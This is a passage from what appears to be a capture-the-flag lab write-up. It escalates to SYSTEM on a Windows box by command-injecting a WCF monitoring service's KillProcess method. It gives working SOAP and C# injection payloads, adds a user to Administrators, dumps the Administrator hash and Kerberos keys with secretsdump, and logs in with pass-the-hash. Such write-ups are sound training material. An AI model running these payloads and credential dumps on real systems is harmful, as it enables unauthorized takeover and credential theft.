evil-winrm-py PS C:\Users\sqlmgmt\Documents>
```

And the user flag:

```console
evil-winrm-py PS C:\Users\sqlmgmt\Desktop> cat user.txt
956ab1b5************************
```

## Shell as Administrator

### Enumeration

#### Users

The `sqlmgmt` directory is empty:

```console
evil-winrm-py PS C:\Users\sqlmgmt> tree /f .
Folder PATH listing
Volume serial number is 736A-0306
C:\USERS\SQLMGMT
+---Desktop
¦       user.txt
¦
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Videos
```

There are no other interesting users with accounts in `C:\Users`:

```console
evil-winrm-py PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/16/2025   4:06 PM                Administrator
d-r---         5/16/2025   4:06 PM                Public
d-----         5/16/2025   8:08 PM                sqlmgmt
```

#### Filesystem

The root of `C:\` is pretty empty:

```console
evil-winrm-py PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/16/2025   4:35 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         5/16/2025   8:11 PM                Program Files
d-----         5/16/2025   5:35 PM                Program Files (x86)
d-----         5/16/2025   5:30 PM                SQL2022
d-r---         5/16/2025   8:08 PM                Users
d-----        12/31/2025  11:17 PM                Windows
```

`inetpub` only has an empty `DeviceHealthAttestation\bin` directory, nothing to chase there. The MSSQL installation is at the root, but there’s nothing interesting there. The two `Program Files` directories contain some dev tools, but the most interesting thing is `nssm-2.24` (the [Non-Sucking Service Manager](https://nssm.cc/)), a tool used to wrap arbitrary executables as Windows services. On a server, this almost always means *something* has been registered as a service through it. Given the WCF `MonitoringService` in `overwatch.exe.config` and the missing port 8000 listener, NSSM is the most likely candidate for how `overwatch.exe` is meant to be run as a service. NSSM service definitions live under `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters`.

I’ll grab all the services running under `nssm.exe`:

```console
evil-winrm-py PS C:\> Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services' | Where-Object { (Get-ItemProperty $_.PSPath -ErrorAction  SilentlyContinue).ImagePath -like '*nssm*' }

    Hive: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services

Name                           Property
----                           --------
overwatch                      Type                             : 16
                               Start                            : 2
                               ErrorControl                     : 1
                               ImagePath                        : C:\Program Files\nssm-2.24\win64\nssm.exe
                               DisplayName                      : overwatch
                               ObjectName                       : LocalSystem
                               DelayedAutostart                 : 0
                               FailureActionsOnNonCrashFailures : 1
                               FailureActions                   : {0, 0, 0, 0...}
```

There’s only one, named `overwatch`. It’s running `overwatch.exe` from the `Software` directory:

```console
evil-winrm-py PS C:\> Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\overwatch\Parameters'

Application   : C:\Software\Monitoring\overwatch.exe
AppParameters :
AppDirectory  : C:\Software\Monitoring
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\
                CurrentControlSet\Services\overwatch\Parameters
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\
                CurrentControlSet\Services\overwatch
PSChildName   : Parameters
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
```

#### Overwatch

`Software` didn’t show up in the `ls` above because it’s hidden:

```console
evil-winrm-py PS C:\> ls -force

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs-          5/8/2021   1:20 AM                $Recycle.Bin
d--h--        12/31/2025  10:46 PM                $WinREAgent
d--hs-         5/16/2025   5:37 PM                Config.Msi
d--hsl         5/16/2025  11:05 PM                Documents and Settings
d-----         5/16/2025   4:35 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         5/16/2025   8:11 PM                Program Files
d-----         5/16/2025   5:35 PM                Program Files (x86)
d--h--        12/31/2025  10:46 PM                ProgramData
d--hs-         5/16/2025  11:05 PM                Recovery
d--h--         5/16/2025   6:27 PM                Software
d-----         5/16/2025   5:30 PM                SQL2022
d--hs-          7/1/2025   9:39 AM                System Volume Information
d-r---         5/16/2025   8:08 PM                Users
d-----        12/31/2025  11:17 PM                Windows
-a-hs-         4/24/2026   3:13 PM          12288 DumpStack.log.tmp
-a-hs-         4/24/2026   3:13 PM      738197504 pagefile.sys
```

`d--h--` shows it’s a directory and it’s hidden. Inside `Software\Monitoring` is the full application, also hidden:

```console
evil-winrm-py PS C:\Software\Monitoring> ls -force

    Directory: C:\Software\Monitoring

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--h--         5/16/2025   6:32 PM                x64
d--h--         5/16/2025   6:32 PM                x86
-a-h--         4/16/2020   1:38 PM        4991352 EntityFramework.dll
-a-h--         4/16/2020   1:38 PM         591752 EntityFramework.SqlServer.dll
-a-h--         4/16/2020   1:38 PM         163193 EntityFramework.SqlServer.xml
-a-h--         4/16/2020   1:38 PM        3738289 EntityFramework.xml
-a-h--         7/17/2017   7:46 AM          36864 Microsoft.Management.Infrastructure.dll
-a-h--         5/16/2025   6:19 PM           9728 overwatch.exe
-a-h--         5/16/2025   6:02 PM           2163 overwatch.exe.config
-a-h--         5/16/2025   6:19 PM          30208 overwatch.pdb
-a-h--         9/29/2024   1:41 PM         450232 System.Data.SQLite.dll
-a-h--         9/29/2024   1:40 PM         206520 System.Data.SQLite.EF6.dll
-a-h--         9/29/2024   1:40 PM         206520 System.Data.SQLite.Linq.dll
-a-h--         9/28/2024  11:48 AM        1245480 System.Data.SQLite.xml
-a-h--         7/17/2017   7:46 AM         360448 System.Management.Automation.dll
-a-h--         7/17/2017   7:46 AM        7145771 System.Management.Automation.xml
```

It is a running process:

```console
evil-winrm-py PS C:\> Get-Process overwatch

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    294      19    32480      31876              4668   0 overwatch
```

A quick check of listening sockets confirms TCP 8000 is bound:

```console
evil-winrm-py PS C:\> Get-NetTCPConnection -State Listen -LocalPort 8000 | Select-Object LocalAddress,LocalPort,OwningProcess

LocalAddress LocalPort OwningProcess
------------ --------- -------------
::                8000             4
0.0.0.0         8000             4
```

PID 4 on Windows is the kernel `System` process. HTTP-bound .NET services don’t open the socket themselves, instead registering a URL prefix with `http.sys`, the kernel HTTP listener, and `http.sys` (running as part of `System`) holds the socket on their behalf and dispatches requests up to the user-mode process. So PID 4 owning port 8000 is exactly what I’d expect for a WCF service using `basicHttpBinding` against `http://overwatch.htb:8000/MonitorService`.

`netsh http show servicestate` walks the live `http.sys` state, listing every URL group currently registered, the request queues attached to it, and the user-mode process IDs subscribed to receive requests for those URLs. Where `urlacl` only shows static reservations, this view shows what is actually being dispatched right now:

```console
evil-winrm-py PS C:\> netsh http show servicestate

Snapshot of HTTP service state (Server Session View):
-----------------------------------------------------
...[snip]...
Server session ID: FD00000010000001
...[snip]...
    URL groups:
    URL group ID: FF00000120000001
        State: Active
        Request queue name: Request queue is unnamed.
        Properties:
            Max bandwidth: inherited
            Max connections: inherited
            Timeouts:
                Timeout values inherited
            Number of registered URLs: 1
            Registered URLs:
                HTTP://+:8000/MONITORSERVICE/

Request queues:
...[snip]...
    Request queue name: Request queue is unnamed.
        Version: 2.0
        State: Active
        Request queue 503 verbosity level: Basic
        Max requests: 1000
        Number of active processes attached: 1
        Processes:
            ID: 4668, image: <?>
        Registered URLs:
            HTTP://+:8000/MONITORSERVICE/
```

The following useful pieces of information come out of this:

- The registered URL prefix is `HTTP://+:8000/MONITORSERVICE/`. The `+` is the `http.sys` wildcard that matches any incoming `Host` header. So even though the WCF config says `http://overwatch.htb:8000/MonitorService`, hitting `http://localhost:8000/MonitorService/` (or the IP, or the FQDN) will all reach the same handler.
- Under `Processes`, the request queue is attached to PID `4668`, which is the same `overwatch.exe` PID I saw earlier with `Get-Process`. That confirms the user-mode WCF host is `overwatch.exe` itself, with `http.sys` (PID 4) just holding the socket on its behalf.

### Command Injection

#### Strategy

At this point I have a WCF service exposing the `KillProcess` PowerShell-injection sink, running as `LocalSystem` and reachable from the localhost-side of the firewall on `http://localhost:8000/MonitorService/`. If I can call `KillProcess` with an injection payload I’ll have RCE.

I’ll show four ways to interact with the WCF application:

- PowerShell Raw SOAP
- PowerShell WebServiceProxy
- WCF Inline Client
- WCF Binary Client

#### PowerShell Raw SOAP

I’ll create a SOAP payload for the WCF request. It’s XML, and pretty printed it will look like:

```powershell
$soap = @'
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>x; whoami #</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>
'@
```

The important part is the `processName` parameter, which I’ve set up to do a command injection to run `whoami` followed by a comment to remove the rest of the line.

This becomes a one-liner to paste into my shell:

```console
evil-winrm-py PS C:\> $s='<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><KillProcess xmlns="http://tempuri.org/"><processName>x; whoami #</processName></KillProcess></s:Body></s:Envelope>'
```

And then I trigger it:

```console
evil-winrm-py PS C:\> (iwr 'http://localhost:8000/MonitorService/' -Method POST -ContentType 'text/xml; charset=utf-8' -Headers @{'SOAPAction'='"http://tempuri.org/IMonitoringService/KillProcess"'} -Body $s -UseBasicParsing).Content
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><KillProcessResponse xmlns="http://tempuri.org/"><KillProcessResult>nt authority\system&#xD;
&#xD;
</KillProcessResult></KillProcessResponse></s:Body></s:Envelope>
```

This is a POST request to `localhost:8000/MonitorService` with a header to identify the `KillProcess` function and the SOAP body. It says “nt authority\system” in the `KillProcessResult` block, which makes sense given the NSSM service was registered with `ObjectName: LocalSystem` (seen earlier in the registry dump).

To abuse this further I’ll update the payload to add the sqlmgmt user to the Administrators group:

```powershell
$soap = @'
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>x; net localgroup Administrators sqlmgmt /add</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>
'@
```

Run it as a one liner:

```console
evil-winrm-py PS C:\> $s='<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><KillProcess xmlns="http://tempuri.org/"><processName>x; net localgroup Administrators sqlmgmt /add</processName></KillProcess></s:Body></s:Envelope>'
```

I’ll trigger it:

```console
evil-winrm-py PS C:\> (iwr 'http://localhost:8000/MonitorService/' -Method POST -ContentType 'text/xml; charset=utf-8' -Headers @{'SOAPAction'='"http://tempuri.org/IMonitoringService/KillProcess"'} -Body $s -UseBasicParsing).Content
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><KillProcessResponse xmlns="http://tempuri.org/"><KillProcessResult>The command completed successfully.&#xD;
&#xD;
&#xD;
</KillProcessResult></KillProcessResponse></s:Body></s:Envelope>
```

It reports success.

#### PowerShell WebServiceProxy

A much simpler shortcut is to use a `WebServiceProxy`, which will provide an interface to handle the underlying complexity. I’ll create the proxy:

```console
evil-winrm-py PS C:\> $proxy = New-WebServiceProxy -Uri "http://localhost:8000/MonitorService?wsdl" -Namespace "WcfProxy"
```

The `$proxy` object can now talk directly to the WCF endpoint:

```console
evil-winrm-py PS C:\> $proxy.KillProcess('x; net localgroup administrators sqlmgmt /add; #')
The command completed successfully.
```

#### WCF Inline Client

Above I used the raw SOAP API, but the more natural way to interact with the WCF interface is with a WCF client. One way to do that is from PowerShell:

```powershell
Add-Type -TypeDefinition @'
using System.ServiceModel;
[ServiceContract(Namespace="http://tempuri.org/")]
public interface IMonitoringService {
    [OperationContract] string KillProcess(string processName);
}
public static class Client {
    public static string Run(string p) {
        var f = new ChannelFactory<IMonitoringService>(
            new BasicHttpBinding(),
            new EndpointAddress("http://localhost:8000/MonitorService/"));
        return f.CreateChannel().KillProcess(p);
    }
}
'@ -ReferencedAssemblies System.ServiceModel
[Client]::Run('x; whoami #')
```

Flattened to a single line so it pastes through evil-winrm-py cleanly, it works:

```console
evil-winrm-py PS C:\> $src='using System.ServiceModel; [ServiceContract(Namespace="http://tempuri.org/")] public interface IMonitoringService { [OperationContract] string KillProcess(string processName); } public static class Client { public static string Run(string p) { var f = new ChannelFactory<IMonitoringService>(new BasicHttpBinding(), new EndpointAddress("http://localhost:8000/MonitorService/"));  return f.CreateChannel().KillProcess(p); } }'; Add-Type -TypeDefinition $src -ReferencedAssemblies System.ServiceModel; [Client]::Run('x; whoami #')
nt authority\system
```

I can do the same thing here to add sqlmgmt to Administrators group, or other abuses from the context of nt authority\system.

#### WCF Binary Client

Probably the most common way to interact with a WCF program is to make a client program. I’ll create a simple WCF program on my VM:

```cs
using System;
using System.ServiceModel;

[ServiceContract(Namespace = "http://tempuri.org/")]
public interface IMonitoringService {
        [OperationContract] string KillProcess(string processName);
}

class Program {
    static void Main(string[] args) {
        var binding = new BasicHttpBinding();
        var endpoint = new EndpointAddress("http://localhost:8000/MonitorService/");
        using (var factory = new ChannelFactory<IMonitoringService>(binding, endpoint)) {
            var client = factory.CreateChannel();
            Console.WriteLine(client.KillProcess("x; " + args[0] + " #"));
        }
    }
}
```

This program opens a typed `IMonitoringService` channel against the WCF endpoint and invokes `KillProcess` with the injection wrapper built in.

I’ll upload this to Overwatch and compile it:

```console
evil-winrm-py PS C:\programdata> wget 10.10.14.61/client.cs -outfile client.cs
evil-winrm-py PS C:\programdata> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.ServiceModel.dll /out:client.exe client.cs
Microsoft (R) Visual C# Compiler version 4.8.4161.0

for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
```

That produces an executable, which I’ll run, giving the command I want to run:

```console
evil-winrm-py PS C:\programdata> .\client.exe "whoami"
nt authority\system
```

I can also just read the flag (from any of these methods)

```console
evil-winrm-py PS C:\programdata> .\client.exe "Get-Content C:\users\administrator\desktop\root.txt"
f263ec97************************
```

### Shell as Administrator

With a user in the Administrators group, I’ll `evil-winrm-py` back in as `sqlmgmt`:

```console
oxdf@hacky$ evil-winrm-py -i S200401.overwatch.htb -u sqlmgmt -p 'bIhBbzMMnB82yx'
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'S200401.overwatch.htb:5985' as 'sqlmgmt'
evil-winrm-py PS C:\Users\sqlmgmt\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

Or I can dump the administrator user’s hash:

```console
oxdf@hacky$ secretsdump.py overwatch/sqlmgmt:bIhBbzMMnB82yx@S200401.overwatch.htb -just-dc-user administrator
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:269fa056205bbf5d47fc2c3682dbbce6:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:2f3c0c1b2c6b7640c5aa32aefa9ae4876b90f3111bddcc4e3d6a6abae8c18320
Administrator:aes128-cts-hmac-sha1-96:2c9b1138615b727dd96f100d4f1327ca
Administrator:des-cbc-md5:988c5b85b04fb358
[*] Cleaning up...
```

And connect with that:

```console
oxdf@hacky$ evil-winrm-py -i S200401.overwatch.htb -u administrator -H 269fa056205bbf5d47fc2c3682dbbce6
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'S200401.overwatch.htb:5985' as 'administrator'
evil-winrm-py PS C:\Users\Administrator\Documents>
```

Either of these shells can get `root.txt`:

```console
evil-winrm-py PS C:\Users\Administrator\Desktop> cat root.txt
f263ec97************************
```

## Beyond Root - HTB Log Leak

### dism.log

#### Log Format

DISM is Windows’ Deployment Image Servicing and Management stack, the engine behind `dism.exe` and the PowerShell `Dism` module that provides `Get-WindowsFeature`, `Add-WindowsCapability`, `Get-WindowsOptionalFeature`. The file is appended to every time a process loads the `DismApi.dll` DLL, which is what provides these functions. Each session is bookended with `<----- Starting DismApi.dll session ----->` and a matching `Ending` line, and at the top of every session DISM writes a chunk of forensic-flavored fields such as API and OS version, processor count, log level, scratch directory, and the parent process command line. For example, the first full session in the log on Overwatch looks like:

```console
<----- Starting DismApi.dll session -----> - DismInitializeInternal
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 DismApi.dll:                                            - DismInitializeInternal
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 DismApi.dll: Host machine information: OS Version=10.0.20348, Running architecture=amd64, Number of processors=2 - DismInitializeInternal
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 DismApi.dll: API Version 10.0.20348.1 - DismInitializeInternal
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 DismApi.dll: Parent process command line: "C:\Program Files\Windows Defender\MpCmdRun.exe" -Roles - DismInitializeInternal
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 Input parameters: LogLevel: 2, LogFilePath: (null), ScratchDirectory: (null) - DismInitializeInternal
2025-05-16 23:05:23, Info                  DISM   Initialized Panther logging at C:\Windows\Logs\DISM\dism.log
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 Initialized GlobalConfig - DismInitializeInternal
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 Initialized SessionTable - DismInitializeInternal
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 Lookup in table by path failed for: DummyPath-2BA51B78-C7F7-4910-B99D-BB7345357CDC - CTransactionalImageTable::LookupImagePath
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 Waiting for m_pInternalThread to start - CCommandThread::Start
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=4352 Enter CCommandThread::CommandThreadProcedureStub - CCommandThread::CommandThreadProcedureStub
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=4352 Enter CCommandThread::ExecuteLoop - CCommandThread::ExecuteLoop
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 CommandThread StartupEvent signaled - CCommandThread::WaitForStartup
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 m_pInternalThread started - CCommandThread::Start
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 Created g_internalDismSession - DismInitializeInternal
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 Input parameters: ImagePath: DISM_{53BFAE52-B167-4E2F-A258-0A37B57FF845}, WindowsDirectory: (null), SystemDrive: (null) - DismOpenSessionInternal
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 Lookup in table by path failed for: DRIVE_C - CTransactionalImageTable::LookupImagePath
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 Waiting for m_pInternalThread to start - CCommandThread::Start
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=4348 Enter CCommandThread::CommandThreadProcedureStub - CCommandThread::CommandThreadProcedureStub
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 CommandThread StartupEvent signaled - CCommandThread::WaitForStartup
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 m_pInternalThread started - CCommandThread::Start
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=3656 Successfully enqueued command object - CCommandThread::EnqueueCommandObject
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=4348 Enter CCommandThread::ExecuteLoop - CCommandThread::ExecuteLoop
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=4348 ExecuteLoop: CommandQueue signaled - CCommandThread::ExecuteLoop
2025-05-16 23:05:23, Info                  DISM   API: PID=3580 TID=4348 Successfully dequeued command object - CCommandThread::DequeueCommandObject
2025-05-16 23:05:23, Info                  DISM   PID=3580 TID=4348 Scratch directory set to 'C:\Windows\TEMP\'. - CDISMManager::put_ScratchDir
2025-05-16 23:05:23, Info                  DISM   PID=3580 TID=4348 DismCore.dll version: 10.0.20348.1 - CDISMManager::FinalConstruct
2025-05-16 23:05:23, Info                  DISM   Initialized Panther logging at C:\Windows\Logs\DISM\dism.log
2025-05-16 23:05:23, Info                  DISM   PID=3580 TID=4348 Successfully loaded the ImageSession at "C:\Windows\system32\Dism" - CDISMManager::LoadLocalImageSession
2025-05-16 23:05:23, Info                  DISM   Initialized Panther logging at C:\Windows\Logs\DISM\dism.log
2025-05-16 23:05:23, Info                  DISM   DISM Provider Store: PID=3580 TID=4348 Found and Initialized the DISM Logger. - CDISMProviderStore::Internal_InitializeLogger
2025-05-16 23:05:23, Info                  DISM   Initialized Panther logging at C:\Windows\Logs\DISM\dism.log
2025-05-16 23:05:23, Info                  DISM   DISM Manager: PID=3580 TID=4348 Successfully created the local image session and provider store. - CDISMManager::CreateLocalImageSession
2025-05-16 23:05:24, Info                  DISM   DISM FFU Provider: PID=3580 TID=4348 [C:\] is not recognized by the DISM FFU provider. - CFfuImage::Initialize
2025-05-16 23:05:24, Info                  DISM   DISM Imaging Provider: PID=3580 TID=4348 The provider FfuManager does not support CreateDismImage on C:\ - CGenericImagingManager::CreateDismImage
2025-05-16 23:05:24, Info                  DISM   DISM VHD Provider: PID=3580 TID=4348 [C:\] is not recognized by the DISM VHD provider. - CVhdImage::Initialize
2025-05-16 23:05:24, Info                  DISM   DISM Imaging Provider: PID=3580 TID=4348 The provider VHDManager does not support CreateDismImage on C:\ - CGenericImagingManager::CreateDismImage
[3580.4348] [0x8007007b] FIOReadFileIntoBuffer:(1458): The filename, directory name, or volume label syntax is incorrect.
[3580.4348] [0xc142011c] UnmarshallImageHandleFromDirectory:(641)
[3580.4348] [0xc142011c] WIMGetMountedImageHandle:(2910)
2025-05-16 23:05:24, Info                  DISM   DISM WIM Provider: PID=3580 TID=4348 [C:\] is not a WIM mount point. - CWimMountedImageInfo::Initialize
2025-05-16 23:05:24, Info                  DISM   DISM Imaging Provider: PID=3580 TID=4348 The provider WimManager does not support CreateDismImage on C:\ - CGenericImagingManager::CreateDismImage
2025-05-16 23:05:24, Info                  DISM   DISM Imaging Provider: PID=3580 TID=4348 No imaging provider supported CreateDismImage for this path - CGenericImagingManager::CreateDismImage
[3580.4348] [0x8007007b] FIOReadFileIntoBuffer:(1458): The filename, directory name, or volume label syntax is incorrect.
[3580.4348] [0xc142011c] UnmarshallImageHandleFromDirectory:(641)
[3580.4348] [0xc142011c] WIMGetMountedImageHandle:(2910)
2025-05-16 23:05:24, Info                  DISM   DISM WIM Provider: PID=3580 TID=4348 [C:\] is not a WIM mount point. - CWimMountedImageInfo::Initialize
2025-05-16 23:05:24, Info                  DISM   DISM FFU Provider: PID=3580 TID=4348 [C:\] is not recognized by the DISM FFU provider. - CFfuImage::Initialize
2025-05-16 23:05:24, Info                  DISM   DISM VHD Provider: PID=3580 TID=4348 [C:\] is not recognized by the DISM VHD provider. - CVhdImage::Initialize
2025-05-16 23:05:24, Info                  DISM   DISM Manager: PID=3580 TID=4348 physical location path: C:\ - CDISMManager::CreateImageSession
2025-05-16 23:05:24, Info                  DISM   DISM Manager: PID=3580 TID=4348 Event name for current DISM session is Global\{743749A9-66AF-4646-82DE-CAD526FFA267} - CDISMManager::CheckSessionAndLock
2025-05-16 23:05:24, Info                  DISM   DISM Manager: PID=3580 TID=4348 Create session event 0x338 for current DISM session and event name is Global\{743749A9-66AF-4646-82DE-CAD526FFA267}  - CDISMManager::CheckSessionAndLock
2025-05-16 23:05:24, Info                  DISM   DISM Manager: PID=3580 TID=4348 Copying DISM from "C:\Windows\System32\Dism" - CDISMManager::CreateImageSessionFromLocation
2025-05-16 23:05:24, Info                  DISM   DISM Manager: PID=3580 TID=4348 Successfully loaded the ImageSession at "C:\Windows\TEMP\70C74420-6511-4CC3-9EA6-EA35A1D5A605" - CDISMManager::LoadRemoteImageSession
2025-05-16 23:05:24, Info                  DISM   DISM Image Session: PID=3316 TID=2288 Instantiating the Provider Store. - CDISMImageSession::get_ProviderStore
2025-05-16 23:05:24, Info                  DISM   DISM OS Provider: PID=3316 TID=2288 Defaulting SystemPath to C:\ - CDISMOSServiceManager::Final_OnConnect
2025-05-16 23:05:24, Info                  DISM   DISM OS Provider: PID=3316 TID=2288 Defaulting Windows folder to C:\Windows - CDISMOSServiceManager::Final_OnConnect
2025-05-16 23:05:24, Info                  DISM   DISM Provider Store: PID=3316 TID=2288 Attempting to initialize the logger from the Image Session. - CDISMProviderStore::Final_OnConnect
2025-05-16 23:05:24, Info                  DISM   Initialized Panther logging at C:\Windows\Logs\DISM\dism.log
2025-05-16 23:05:24, Info                  DISM   DISM Provider Store: PID=3316 TID=2288 Found and Initialized the DISM Logger. - CDISMProviderStore::Internal_InitializeLogger
2025-05-16 23:05:24, Info                  DISM   Initialized Panther logging at C:\Windows\Logs\DISM\dism.log
2025-05-16 23:05:24, Info                  DISM   Initialized Panther logging at C:\Windows\Logs\DISM\dism.log
2025-05-16 23:05:24, Info                  DISM   DISM Manager: PID=3580 TID=4348 Image session successfully loaded from the temporary location: C:\Windows\TEMP\70C74420-6511-4CC3-9EA6-EA35A1D5A605 - CDISMManager::CreateImageSession
2025-05-16 23:05:24, Info                  DISM   API: PID=3580 TID=4348 Target image information: OS Version=10.0.20348.405, Image architecture=amd64 - CDismCore::LogImageSessionDetails
2025-05-16 23:05:24, Info                  DISM   API: PID=3580 TID=3656 Session id is: 2 - DismOpenSessionInternal
2025-05-16 23:05:24, Info                  DISM   API: PID=3580 TID=3656 Input parameters: Session: 2, Identifier: (null), PackageIdentifier: 0 - DismGetFeaturesInternal
2025-05-16 23:05:24, Info                  DISM   API: PID=3580 TID=3656 Successfully enqueued command object - CCommandThread::EnqueueCommandObject
2025-05-16 23:05:24, Info                  DISM   API: PID=3580 TID=4348 ExecuteLoop: CommandQueue signaled - CCommandThread::ExecuteLoop
2025-05-16 23:05:24, Info                  DISM   API: PID=3580 TID=4348 Successfully dequeued command object - CCommandThread::DequeueCommandObject
2025-05-16 23:05:24, Info                  CSI    00000001 Shim considered [l:125]'\??\C:\Windows\Servicing\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.403_none_f21fbb46513ab2d5\wcp.dll' : got STATUS_OBJECT_PATH_NOT_FOUND
2025-05-16 23:05:24, Info                  CSI    00000002 Shim considered [l:122]'\??\C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.403_none_f21fbb46513ab2d5\wcp.dll' : got STATUS_SUCCESS
2025-05-16 23:05:24, Info                  DISM   DISM OS Provider: PID=3316 TID=2288 Determined System directory to be C:\Windows\System32 - CDISMOSServiceManager::get_SystemDirectory
2025-05-16 23:05:24, Info                  DISM   DISM Package Manager: PID=3316 TID=2288 Finished initializing the CbsConUI Handler. - CCbsConUIHandler::Initialize
2025-05-16 23:05:24, Info                  CSI    00000001 Shim considered [l:125]'\??\C:\Windows\Servicing\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.403_none_f21fbb46513ab2d5\wcp.dll' : got STATUS_OBJECT_PATH_NOT_FOUND
2025-05-16 23:05:24, Info                  CSI    00000002 Shim considered [l:122]'\??\C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.403_none_f21fbb46513ab2d5\wcp.dll' : got STATUS_SUCCESS
2025-05-16 23:05:24, Info                  DISM   DISM Package Manager: PID=3316 TID=2288 CBS is being initialized for online use. More information about CBS actions can be located at: %windir%\logs\cbs\cbs.log - CDISMPackageManager::Initialize
2025-05-16 23:05:24, Error                 DISM   DISM Package Manager: PID=3316 TID=2288 Failed to create session classID - waiting for a second and trying again, hr:0x8007045b - CDISMPackageManager::CreateCbsSession(hr:0x8007045b)
2025-05-16 23:05:25, Error                 DISM   DISM Package Manager: PID=3316 TID=2288 Failed to create session classID - waiting for a second and trying again, hr:0x8007045b - CDISMPackageManager::CreateCbsSession(hr:0x8007045b)
